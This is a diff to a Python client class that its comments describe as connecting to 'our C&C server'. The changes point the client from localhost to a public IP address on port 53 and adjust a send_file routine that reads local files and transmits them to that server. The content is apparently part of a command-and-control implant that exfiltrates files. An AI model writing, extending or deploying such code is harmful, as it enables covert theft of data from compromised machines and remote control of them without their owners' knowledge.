@@ -14,12 +14,12 @@ class client:
     # socket for connection to the server
     sock_to_server = None
     # ip address of our C&C server, can be changed depending on what ip server is located
-    # host = '18.205.103.236'
-    host = 'localhost'
+    host = '18.205.103.236'
+    # host = 'localhost'
 
     # port of the server to connect to, can be changed depending on what port server is listening at
-    # port = 53
-    port = 3000
+    port = 53
+    # port = 3000
 
     BUFFER_SIZE = 20480
 
@@ -181,6 +181,7 @@ class client:
     def send_file(self, filename):
         file_size = os.path.getsize(filename)
         self.client_send(f"BEGIN{filename}{client.SEPARATOR}{file_size}".encode())
+        self.client_recv()
         with open(filename, "rb") as file:
             bytes = file.read(client.BUFFER_SIZE)
             while bytes:
